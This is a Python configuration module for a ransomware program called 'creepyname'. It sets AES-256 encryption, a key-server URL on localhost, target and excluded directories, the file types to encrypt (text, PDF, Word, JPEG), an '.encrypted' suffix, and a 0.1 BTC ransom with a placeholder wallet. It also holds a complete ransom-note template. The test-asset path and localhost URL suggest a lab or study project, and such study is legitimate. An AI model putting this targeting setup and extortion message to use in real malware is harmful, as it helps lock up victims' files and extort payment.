__NAME__: str = "creepyname"

__AES_KEY_SIZE__ = 256

__KEY_URL__: str = "http://localhost:8000/keys"

__ROOT_DIRS__: list[str] = ["./tests/assets"]

__INTEVAL__: float = 0.1

__EXCLUDE_DIRS__: list[str] = ["/usr", "/bin"]

__FILE_EXTS__: list[str] = [".txt", ".pdf", ".docx", ".jpg"]

__FILE_ADDITIONAL_EXT__: str = ".encrypted"

__BTC_ADDRESS__: str = "---"

__BTC_AMOUNT__: float = 0.1

__MESSAGE__: str = f"""
Your files have been encrypted.

To decrypt your files, please send us {__BTC_AMOUNT__} BTC to the following address:
{__BTC_ADDRESS__}

After we receive your payment, we will send you the decryption key.

Thank you for your cooperation.

Your ID is: {{id}}
"""

__README_FILE__ = f"README.{__NAME__}.txt"


__all__ = [
    "__NAME__",
    "__AES_KEY_SIZE__",
    "__KEY_URL__",
    "__ROOT_DIRS__",
    "__INTEVAL__",
    "__EXCLUDE_DIRS__",
    "__FILE_EXTS__",
    "__FILE_ADDITIONAL_EXT__",
    "__BTC_ADDRESS__",
    "__BTC_AMOUNT__",
    "__MESSAGE__",
    "__README_FILE__",
]
